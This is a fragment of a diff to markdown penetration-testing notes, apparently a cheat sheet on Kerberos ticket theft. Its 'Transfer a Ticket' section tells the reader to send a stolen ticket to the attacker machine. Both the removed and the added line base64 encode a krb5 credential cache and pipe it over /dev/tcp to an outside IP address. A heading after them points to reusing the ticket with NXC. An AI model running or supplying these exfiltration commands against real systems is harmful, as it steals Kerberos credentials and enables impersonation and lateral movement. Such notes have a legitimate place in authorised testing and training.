@@ -28,7 +28,7 @@ env | grep -i krb5
 ##  Transfer a Ticket
 First base64 encode the ticket and send it to attacker machine.
 ```
-base64 krb5cc_50 > /dev/tcp/10.10.15.6/9011
+base64 /tmp/.cache/krb5cc.18494 > /dev/tcp/10.10.15.6/8088
 ```
 ### Use the Kerberos ticket with NXC
 ```
